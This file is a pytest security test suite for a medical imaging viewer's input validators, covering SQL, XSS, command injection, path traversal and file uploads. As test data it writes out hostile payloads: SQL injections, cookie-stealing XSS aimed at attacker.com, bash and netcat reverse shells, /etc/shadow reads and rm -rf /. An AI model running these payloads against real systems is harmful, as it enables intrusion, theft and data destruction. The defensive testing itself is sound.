"""
Input Validation Security Tests
Medical Imaging Viewer - OWASP Top 10 Protection Testing Suite

ISO 27001 A.14.2.1 - Secure development policy
ISO 27001 A.14.2.5 - Secure system engineering principles
ISO 27001 A.14.2.8 - System security testing

OWASP Top 10 2021:
- A03:2021 – Injection (SQL, Command, XSS)
- A01:2021 – Broken Access Control (Path Traversal)
- A04:2021 – Insecure Design (Input validation)

OWASP ASVS 4.0:
- V5.1: Input Validation Requirements
- V5.2: Sanitization and Sandboxing Requirements
- V5.3: Output Encoding and Injection Prevention

This module tests protection against:
1. SQL Injection attacks (all variants)
2. Cross-Site Scripting (XSS) attacks
3. Command Injection attacks
4. Path Traversal attacks
5. File Upload vulnerabilities
6. Property-based fuzzing with Hypothesis

@module tests.security.test_input_validation
@version 2.0.0 - Enterprise Security Testing
"""

import pytest
from typing import List
from hypothesis import given, strategies as st, settings, HealthCheck

from app.core.security.validators import (
    SQLValidator,
    XSSValidator,
    CommandInjectionValidator,
    PathTraversalValidator,
    FileUploadValidator,
    InputValidator,
    SQLInjectionDetected,
    XSSDetected,
    CommandInjectionDetected,
    PathTraversalDetected,
    InvalidFileFormat,
    MaliciousFileDetected,
)


# =============================================================================
# SQL INJECTION PROTECTION TESTS
# OWASP Top 10 2021 - A03:2021 – Injection
# =============================================================================

@pytest.mark.security
@pytest.mark.input_validation
class TestSQLInjectionProtection:
    """Test protection against SQL injection attacks."""

    def test_detect_classic_sql_injection(self, sql_injection_payloads: List[str]):
        """Test detection of classic SQL injection patterns."""
        validator = SQLValidator()

        for payload in sql_injection_payloads:
            with pytest.raises(SQLInjectionDetected) as exc_info:
                validator.validate(payload)

            # Verify exception contains payload info
            assert payload[:50] in str(exc_info.value) or "SQL injection" in str(exc_info.value)

    def test_allow_safe_sql_strings(self):
        """Test that safe strings are allowed."""
        validator = SQLValidator()

        safe_strings = [
            "John Doe",
            "test@example.com",
            "Patient ID: 12345",
            "Normal text with numbers 123",
            "Hyphenated-name",
            "O'Brien",  # Single quote in name (should be allowed)
        ]

        for safe_string in safe_strings:
            try:
                validator.validate(safe_string)
            except SQLInjectionDetected:
                pytest.fail(f"Safe string incorrectly flagged as SQL injection: {safe_string}")

    def test_detect_union_based_injection(self):
        """Test detection of UNION-based SQL injection."""
        validator = SQLValidator()

        union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT username, password FROM users--",
            "1' UNION ALL SELECT NULL,NULL,NULL--",
        ]

        for payload in union_payloads:
            with pytest.raises(SQLInjectionDetected):
                validator.validate(payload)

    def test_detect_blind_sql_injection(self):
        """Test detection of blind SQL injection."""
        validator = SQLValidator()

        blind_payloads = [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(5)--",
            "' WAITFOR DELAY '00:00:05'--",
        ]

        for payload in blind_payloads:
            with pytest.raises(SQLInjectionDetected):
                validator.validate(payload)

    def test_detect_stacked_queries(self):
        """Test detection of stacked query injection."""
        validator = SQLValidator()

        stacked_payloads = [
            "'; DROP TABLE users--",
            "'; DELETE FROM patients WHERE '1'='1",
            "1; UPDATE users SET role='admin'--",
        ]

        for payload in stacked_payloads:
            with pytest.raises(SQLInjectionDetected):
                validator.validate(payload)

    def test_detect_error_based_injection(self):
        """Test detection of error-based SQL injection."""
        validator = SQLValidator()

        error_payloads = [
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND EXTRACTVALUE(1, CONCAT(0x01, (SELECT database())))--",
        ]

        for payload in error_payloads:
            with pytest.raises(SQLInjectionDetected):
                validator.validate(payload)

    def test_detect_nosql_injection(self):
        """Test detection of NoSQL injection patterns."""
        validator = SQLValidator()

        nosql_payloads = [
            "{'$ne': null}",
            "{'$gt': ''}",
            "admin' || '1'=='1",
        ]

        for payload in nosql_payloads:
            with pytest.raises(SQLInjectionDetected):
                validator.validate(payload)

    def test_detect_bypass_techniques(self):
        """Test detection of filter bypass techniques."""
        validator = SQLValidator()

        bypass_payloads = [
            "' oR '1'='1",  # Case variation
            "' OR/*comment*/1=1--",  # Comment injection
            "' OR 0x31=0x31--",  # Hex encoding
        ]

        for payload in bypass_payloads:
            with pytest.raises(SQLInjectionDetected):
                validator.validate(payload)


# =============================================================================
# XSS PROTECTION TESTS
# OWASP Top 10 2021 - A03:2021 – Injection
# =============================================================================

@pytest.mark.security
@pytest.mark.input_validation
class TestXSSProtection:
    """Test protection against Cross-Site Scripting attacks."""

    def test_detect_basic_xss(self, xss_payloads: List[str]):
        """Test detection of basic XSS patterns."""
        validator = XSSValidator()

        for payload in xss_payloads:
            with pytest.raises(XSSDetected) as exc_info:
                validator.validate(payload)

            assert "XSS" in str(exc_info.value) or payload[:50] in str(exc_info.value)

    def test_allow_safe_html_entities(self):
        """Test that safe HTML entities are allowed."""
        validator = XSSValidator()

        safe_strings = [
            "Normal text",
            "Text with <b>bold</b> (if using sanitization library)",
            "Email: test@example.com",
            "Price: $100 < $200",
            "Math: 5 > 3",
        ]

        # Note: <b> tags would normally be sanitized, not rejected
        # This tests the validator's ability to distinguish malicious from benign
        for safe_string in safe_strings:
            try:
                result = validator.validate(safe_string, allow_safe_tags=True)
                # Should either pass or be sanitized, not raise exception
            except XSSDetected:
                # Expected for strings with HTML tags when allow_safe_tags=False
                pass

    def test_detect_script_tag_xss(self):
        """Test detection of <script> tag XSS."""
        validator = XSSValidator()

        script_payloads = [
            "<script>alert('XSS')</script>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<script src='http://evil.com/xss.js'></script>",
        ]

        for payload in script_payloads:
            with pytest.raises(XSSDetected):
                validator.validate(payload)

    def test_detect_event_handler_xss(self):
        """Test detection of event handler XSS."""
        validator = XSSValidator()

        event_payloads = [
            "<img src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
        ]

        for payload in event_payloads:
            with pytest.raises(XSSDetected):
                validator.validate(payload)

    def test_detect_javascript_protocol(self):
        """Test detection of javascript: protocol XSS."""
        validator = XSSValidator()

        protocol_payloads = [
            "javascript:alert('XSS')",
            "<a href='javascript:alert(\"XSS\")'>Click</a>",
        ]

        for payload in protocol_payloads:
            with pytest.raises(XSSDetected):
                validator.validate(payload)

    def test_detect_encoded_xss(self):
        """Test detection of encoded XSS payloads."""
        validator = XSSValidator()

        encoded_payloads = [
            "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoding
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",  # HTML entities
        ]

        for payload in encoded_payloads:
            with pytest.raises(XSSDetected):
                validator.validate(payload)

    def test_detect_dom_based_xss(self):
        """Test detection of DOM-based XSS patterns."""
        validator = XSSValidator()

        dom_payloads = [
            "<img src='x' onerror='document.location=\"http://attacker.com?cookie=\"+document.cookie'>",
            "<iframe src='javascript:alert(document.cookie)'></iframe>",
        ]

        for payload in dom_payloads:
            with pytest.raises(XSSDetected):
                validator.validate(payload)

    def test_sanitize_xss_payload(self):
        """Test XSS payload sanitization."""
        validator = XSSValidator()

        payload = "<script>alert('XSS')</script>Normal text"
        sanitized = validator.sanitize(payload)

        # Script tags should be removed/escaped
        assert "<script>" not in sanitized.lower()
        assert "Normal text" in sanitized  # Safe content preserved


# =============================================================================
# COMMAND INJECTION PROTECTION TESTS
# OWASP Top 10 2021 - A03:2021 – Injection
# =============================================================================

@pytest.mark.security
@pytest.mark.input_validation
class TestCommandInjectionProtection:
    """Test protection against OS command injection attacks."""

    def test_detect_command_injection(self, command_injection_payloads: List[str]):
        """Test detection of command injection patterns."""
        validator = CommandInjectionValidator()

        for payload in command_injection_payloads:
            with pytest.raises(CommandInjectionDetected) as exc_info:
                validator.validate(payload)

            assert "command injection" in str(exc_info.value).lower() or payload[:50] in str(exc_info.value)

    def test_allow_safe_filenames(self):
        """Test that safe filenames are allowed."""
        validator = CommandInjectionValidator()

        safe_filenames = [
            "patient_scan_001.dcm",
            "mri_study_2024.nii.gz",
            "report-final.pdf",
            "image_001.jpg",
        ]

        for filename in safe_filenames:
            try:
                validator.validate(filename)
            except CommandInjectionDetected:
                pytest.fail(f"Safe filename incorrectly flagged: {filename}")

    def test_detect_command_chaining(self):
        """Test detection of command chaining attacks."""
        validator = CommandInjectionValidator()

        chaining_payloads = [
            "; ls -la",
            "& dir",
            "| cat /etc/passwd",
            "&& whoami",
            "|| uname -a",
        ]

        for payload in chaining_payloads:
            with pytest.raises(CommandInjectionDetected):
                validator.validate(payload)

    def test_detect_command_substitution(self):
        """Test detection of command substitution attacks."""
        validator = CommandInjectionValidator()

        substitution_payloads = [
            "`whoami`",
            "$(whoami)",
            "${IFS}cat${IFS}/etc/passwd",
        ]

        for payload in substitution_payloads:
            with pytest.raises(CommandInjectionDetected):
                validator.validate(payload)

    def test_detect_reverse_shell_attempts(self):
        """Test detection of reverse shell attempts."""
        validator = CommandInjectionValidator()

        reverse_shell_payloads = [
            "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "| nc -e /bin/sh attacker.com 4444",
        ]

        for payload in reverse_shell_payloads:
            with pytest.raises(CommandInjectionDetected):
                validator.validate(payload)


# =============================================================================
# PATH TRAVERSAL PROTECTION TESTS
# OWASP Top 10 2021 - A01:2021 – Broken Access Control
# =============================================================================

@pytest.mark.security
@pytest.mark.input_validation
class TestPathTraversalProtection:
    """Test protection against path traversal attacks."""

    def test_detect_path_traversal(self, path_traversal_payloads: List[str]):
        """Test detection of path traversal patterns."""
        validator = PathTraversalValidator()

        for payload in path_traversal_payloads:
            with pytest.raises(PathTraversalDetected) as exc_info:
                validator.validate(payload)

            assert "path traversal" in str(exc_info.value).lower() or payload[:50] in str(exc_info.value)

    def test_allow_safe_paths(self):
        """Test that safe paths are allowed."""
        validator = PathTraversalValidator()

        safe_paths = [
            "patient_001/scan.dcm",
            "studies/2024/study_001.nii.gz",
            "uploads/image.jpg",
            "reports/final_report.pdf",
        ]

        for path in safe_paths:
            try:
                validator.validate(path)
            except PathTraversalDetected:
                pytest.fail(f"Safe path incorrectly flagged: {path}")

    def test_detect_basic_traversal(self):
        """Test detection of basic path traversal."""
        validator = PathTraversalValidator()

        basic_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ]

        for payload in basic_payloads:
            with pytest.raises(PathTraversalDetected):
                validator.validate(payload)

    def test_detect_absolute_paths(self):
        """Test detection of absolute path attempts."""
        validator = PathTraversalValidator()

        absolute_payloads = [
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "\\\\?\\C:\\Windows\\System32",
        ]

        for payload in absolute_payloads:
            with pytest.raises(PathTraversalDetected):
                validator.validate(payload)

    def test_detect_encoded_traversal(self):
        """Test detection of encoded path traversal."""
        validator = PathTraversalValidator()

        encoded_payloads = [
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5C..%5C..%5Cwindows%5Csystem32",
            "..%252F..%252F..%252Fetc%252Fpasswd",  # Double encoding
        ]

        for payload in encoded_payloads:
            with pytest.raises(PathTraversalDetected):
                validator.validate(payload)

    def test_detect_null_byte_injection(self):
        """Test detection of null byte injection in paths."""
        validator = PathTraversalValidator()

        null_byte_payloads = [
            "../../../etc/passwd%00.jpg",
            "config%00.txt",
        ]

        for payload in null_byte_payloads:
            with pytest.raises(PathTraversalDetected):
                validator.validate(payload)


# =============================================================================
# FILE UPLOAD VALIDATION TESTS
# OWASP ASVS 4.0 V12.1 - File Upload Requirements
# =============================================================================

@pytest.mark.security
@pytest.mark.input_validation
class TestFileUploadValidation:
    """Test file upload validation and malware detection."""

    def test_validate_dicom_file_format(self, sample_dicom_file_path):
        """Test validation of valid DICOM files."""
        validator = FileUploadValidator()

        # Read file content
        with open(sample_dicom_file_path, 'rb') as f:
            content = f.read()

        try:
            validator.validate_file_format(content, "test.dcm", allowed_formats=['DICOM'])
        except (InvalidFileFormat, MaliciousFileDetected):
            pytest.fail("Valid DICOM file incorrectly rejected")

    def test_validate_nifti_file_format(self, sample_nifti_file_path):
        """Test validation of valid NIfTI files."""
        validator = FileUploadValidator()

        with open(sample_nifti_file_path, 'rb') as f:
            content = f.read()

        try:
            validator.validate_file_format(content, "test.nii.gz", allowed_formats=['NIFTI'])
        except (InvalidFileFormat, MaliciousFileDetected):
            pytest.fail("Valid NIfTI file incorrectly rejected")

    def test_reject_invalid_file_format(self):
        """Test rejection of invalid file formats."""
        validator = FileUploadValidator()

        # Try to upload .exe file as DICOM
        fake_dicom = b"MZ\x90\x00"  # PE executable header

        with pytest.raises((InvalidFileFormat, MaliciousFileDetected)):
            validator.validate_file_format(fake_dicom, "malware.dcm", allowed_formats=['DICOM'])

    def test_detect_malicious_files(self, malicious_file_payloads):
        """Test detection of malicious file uploads."""
        validator = FileUploadValidator()

        for filename, content in malicious_file_payloads.items():
            with pytest.raises((InvalidFileFormat, MaliciousFileDetected)):
                validator.validate_file_format(content, filename, allowed_formats=['DICOM', 'NIFTI'])

    def test_detect_eicar_test_file(self, malicious_file_payloads):
        """Test detection of EICAR antivirus test file."""
        validator = FileUploadValidator()

        eicar_content = malicious_file_payloads["eicar.txt"]

        with pytest.raises(MaliciousFileDetected) as exc_info:
            validator.validate_file_format(eicar_content, "eicar.txt", allowed_formats=['TEXT'])

        assert "malicious" in str(exc_info.value).lower() or "eicar" in str(exc_info.value).lower()

    def test_detect_web_shell(self, malicious_file_payloads):
        """Test detection of web shell uploads."""
        validator = FileUploadValidator()

        webshell_content = malicious_file_payloads["webshell.php"]

        with pytest.raises(MaliciousFileDetected):
            validator.validate_file_format(webshell_content, "webshell.php", allowed_formats=['PHP'])

    def test_detect_polyglot_file(self, malicious_file_payloads):
        """Test detection of polyglot files (valid image + executable)."""
        validator = FileUploadValidator()

        polyglot_content = malicious_file_payloads["polyglot.jpg"]

        # Should detect executable code in image
        with pytest.raises(MaliciousFileDetected):
            validator.validate_file_format(polyglot_content, "polyglot.jpg", allowed_formats=['JPEG'])

    def test_file_size_validation(self):
        """Test file size limit enforcement."""
        validator = FileUploadValidator(max_file_size_mb=10)

        # 11 MB file (exceeds limit)
        large_file = b"X" * (11 * 1024 * 1024)

        with pytest.raises(InvalidFileFormat) as exc_info:
            validator.validate_file_format(large_file, "large.dcm", allowed_formats=['DICOM'])

        assert "size" in str(exc_info.value).lower() or "large" in str(exc_info.value).lower()

    def test_filename_validation(self):
        """Test filename validation for security."""
        validator = FileUploadValidator()

        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "image.jpg\x00.php",  # Null byte injection
            "<script>alert('XSS')</script>.jpg",
        ]

        for filename in malicious_filenames:
            with pytest.raises((PathTraversalDetected, InvalidFileFormat)):
                validator.validate_filename(filename)


# =============================================================================
# INTEGRATED INPUT VALIDATOR TESTS
# Comprehensive input validation combining all validators
# =============================================================================

@pytest.mark.security
@pytest.mark.input_validation
class TestIntegratedInputValidator:
    """Test integrated input validator combining all validation types."""

    def test_comprehensive_validation(self):
        """Test comprehensive input validation."""
        validator = InputValidator()

        # Safe input should pass all validations
        safe_input = {
            "username": "john_doe",
            "email": "john@example.com",
            "filename": "scan_001.dcm",
            "search_query": "patient name",
        }

        for field, value in safe_input.items():
            try:
                validator.validate(value, validation_types=['sql', 'xss', 'command', 'path'])
            except Exception as e:
                pytest.fail(f"Safe input incorrectly rejected for {field}: {e}")

    def test_multi_vector_attack_detection(self):
        """Test detection of inputs with multiple attack vectors."""
        validator = InputValidator()

        multi_vector_payloads = [
            "'; DROP TABLE users; <script>alert('XSS')</script>",  # SQL + XSS
            "../../../etc/passwd && cat /etc/shadow",  # Path traversal + Command injection
            "' OR '1'='1' --; rm -rf /",  # SQL + Command injection
        ]

        for payload in multi_vector_payloads:
            # Should raise one of the validation exceptions
            with pytest.raises((SQLInjectionDetected, XSSDetected, CommandInjectionDetected, PathTraversalDetected)):
                validator.validate(payload, validation_types=['sql', 'xss', 'command', 'path'])


# =============================================================================
# PROPERTY-BASED FUZZING TESTS WITH HYPOTHESIS
# Advanced security testing using random input generation
# =============================================================================

@pytest.mark.security
@pytest.mark.input_validation
@pytest.mark.property
@pytest.mark.fuzzing
class TestInputValidationPropertyBased:
    """Property-based fuzzing tests for input validation."""

    @given(text_input=st.text(min_size=1, max_size=500))
    @settings(suppress_health_check=[HealthCheck.function_scoped_fixture], max_examples=100)
    def test_sql_validator_never_crashes(self, text_input: str):
        """
        Property: SQL validator should never crash, regardless of input.

        Tests that the validator handles ANY input gracefully.
        """
        validator = SQLValidator()

        try:
            validator.validate(text_input)
            # If no exception, input was deemed safe
        except SQLInjectionDetected:
            # If exception raised, input was flagged as malicious
            # Both outcomes are acceptable, as long as it doesn't crash
            pass
        except Exception as e:
            pytest.fail(f"SQL validator crashed on input: {text_input[:100]} | Error: {e}")

    @given(text_input=st.text(min_size=1, max_size=500))
    @settings(suppress_health_check=[HealthCheck.function_scoped_fixture], max_examples=100)
    def test_xss_validator_never_crashes(self, text_input: str):
        """
        Property: XSS validator should never crash, regardless of input.
        """
        validator = XSSValidator()

        try:
            validator.validate(text_input)
        except XSSDetected:
            pass
        except Exception as e:
            pytest.fail(f"XSS validator crashed on input: {text_input[:100]} | Error: {e}")

    @given(filename=st.text(alphabet=st.characters(whitelist_categories=('L', 'N', 'P')), min_size=1, max_size=100))
    @settings(suppress_health_check=[HealthCheck.function_scoped_fixture], max_examples=50)
    def test_path_validator_handles_all_filenames(self, filename: str):
        """
        Property: Path validator should handle all possible filenames.
        """
        validator = PathTraversalValidator()

        try:
            validator.validate(filename)
        except PathTraversalDetected:
            # Expected for malicious paths
            pass
        except Exception as e:
            pytest.fail(f"Path validator crashed on filename: {filename[:100]} | Error: {e}")

    @given(
        file_content=st.binary(min_size=0, max_size=1024),
        filename=st.text(min_size=1, max_size=50)
    )
    @settings(suppress_health_check=[HealthCheck.function_scoped_fixture], max_examples=30)
    def test_file_validator_handles_all_files(self, file_content: bytes, filename: str):
        """
        Property: File validator should handle all file contents gracefully.
        """
        validator = FileUploadValidator()

        try:
            validator.validate_file_format(file_content, filename, allowed_formats=['DICOM', 'NIFTI'])
        except (InvalidFileFormat, MaliciousFileDetected, PathTraversalDetected):
            # Expected for invalid/malicious files
            pass
        except Exception as e:
            pytest.fail(f"File validator crashed | Error: {e}")


# =============================================================================
# MEDICAL IMAGING SPECIFIC VALIDATION TESTS
# Domain-specific security testing
# =============================================================================

@pytest.mark.security
@pytest.mark.input_validation
class TestMedicalImagingValidation:
    """Test input validation specific to medical imaging context."""

    def test_validate_patient_id_format(self):
        """Test validation of patient ID format."""
        validator = InputValidator()

        valid_patient_ids = [
            "PAT-2024-12345",
            "MRN-001234",
            "PATIENT_001",
        ]

        for patient_id in valid_patient_ids:
            try:
                validator.validate(patient_id, validation_types=['sql', 'xss', 'command'])
            except Exception:
                pytest.fail(f"Valid patient ID incorrectly rejected: {patient_id}")

    def test_reject_malicious_patient_id(self):
        """Test rejection of malicious patient IDs."""
        validator = InputValidator()

        malicious_ids = [
            "PAT-2024-12345'; DROP TABLE patients--",
            "MRN-<script>alert('XSS')</script>",
            "PATIENT_001 && rm -rf /",
        ]

        for malicious_id in malicious_ids:
            with pytest.raises((SQLInjectionDetected, XSSDetected, CommandInjectionDetected)):
                validator.validate(malicious_id, validation_types=['sql', 'xss', 'command'])

    def test_validate_dicom_metadata(self):
        """Test validation of DICOM metadata fields."""
        validator = InputValidator()

        metadata = {
            "PatientName": "Doe^John",
            "StudyDescription": "Brain MRI with contrast",
            "SeriesDescription": "T1 Axial",
            "Modality": "MR",
        }

        for field, value in metadata.items():
            try:
                validator.validate(value, validation_types=['sql', 'xss'])
            except Exception:
                pytest.fail(f"Valid DICOM metadata incorrectly rejected: {field}={value}")

    def test_reject_malicious_dicom_metadata(self):
        """Test rejection of malicious DICOM metadata."""
        validator = InputValidator()

        malicious_metadata = {
            "PatientName": "Doe'; DROP TABLE patients--",
            "StudyDescription": "<script>alert('XSS')</script>",
            "SeriesDescription": "; cat /etc/passwd",
        }

        for field, value in malicious_metadata.items():
            with pytest.raises((SQLInjectionDetected, XSSDetected, CommandInjectionDetected)):
                validator.validate(value, validation_types=['sql', 'xss', 'command'])
